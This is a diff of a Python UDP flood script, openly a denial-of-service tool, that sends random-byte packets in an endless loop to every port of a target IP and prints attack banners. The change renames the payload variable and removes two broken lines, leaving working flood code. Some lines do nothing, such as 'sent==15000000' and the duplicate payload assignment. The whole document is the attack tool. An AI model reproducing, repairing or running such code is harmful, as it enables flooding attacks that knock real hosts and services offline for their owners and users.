@@ -3,14 +3,14 @@ import socket
 import os
 import random
 import time
-
+import sys
 B = '\033[1m'
 R = '\033[31m'
 N = '\033[0m'
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(21155)
-bytes = random._urandom(35512)
+K_ibytes = random._urandom(21155)
+K_ibytes = random._urandom(35512)
 
 os.system("clear")
 
@@ -50,11 +50,9 @@ time.sleep(3)
 while True:
     sent = 0
     for port in range(1, 65534):
-        white.sendto(bytes, (ip, port))
+        white.sendto(K_ibytes, (ip, port))
         sent = sent + 1
         sent==15000000
-        bytes = bytes + 1
-        bytes==15000000
         print("\033[1;91mHas Been Attack ====> \033[1;32m%s \033[1;91m Has Been Sent Packet to =====> \033[1;32m%s \033[1;91mHas Been Attack Port =====> \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
